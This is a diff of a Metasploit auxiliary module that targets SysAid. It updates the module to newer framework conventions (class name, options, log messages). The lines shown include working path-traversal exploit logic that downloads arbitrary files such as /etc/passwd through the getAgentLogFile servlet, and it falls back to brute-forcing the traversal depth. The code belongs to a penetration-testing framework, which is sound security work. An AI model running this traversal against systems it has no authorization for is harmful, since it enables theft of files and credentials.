@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
 
@@ -44,11 +41,11 @@ class Metasploit3 < Msf::Auxiliary
         OptPort.new('RPORT', [true, 'The target port', 8080]),
         OptString.new('TARGETURI', [ true,  "SysAid path", '/sysaid']),
         OptString.new('FILEPATH', [false, 'Path of the file to download (escape Windows paths with a back slash)', '/etc/passwd']),
-      ], self.class)
+      ])
   end
 
   def get_traversal_path
-    print_status("#{peer} - Trying to find out the traversal path...")
+    print_status("Trying to find out the traversal path...")
     large_traversal = '../' * rand(15...30)
     servlet_path = 'getAgentLogFile'
 
@@ -86,7 +83,7 @@ class Metasploit3 < Msf::Auxiliary
         },
       })
     rescue Rex::ConnectionRefused
-      print_error("#{peer} - Could not connect.")
+      print_error("Could not connect.")
       return
     end
   end
@@ -97,7 +94,7 @@ class Metasploit3 < Msf::Auxiliary
       fail_with(Failure::BadConfig, 'Please supply the path of the file you want to download.')
     end
 
-    print_status("#{peer} - Downloading file #{datastore['FILEPATH']}")
+    print_status("Downloading file #{datastore['FILEPATH']}")
     if datastore['FILEPATH'] =~ /([A-Za-z]{1}):(\\*)(.*)/
       file_path = $3
     else
@@ -106,7 +103,7 @@ class Metasploit3 < Msf::Auxiliary
 
     traversal_path = get_traversal_path
     if traversal_path.nil?
-      print_error("#{peer} - Could not get traversal path, using bruteforce to download the file")
+      print_error("Could not get traversal path, using bruteforce to download the file")
       count = 1
       while count < 15
         res = download_file(('../' * count) + file_path)
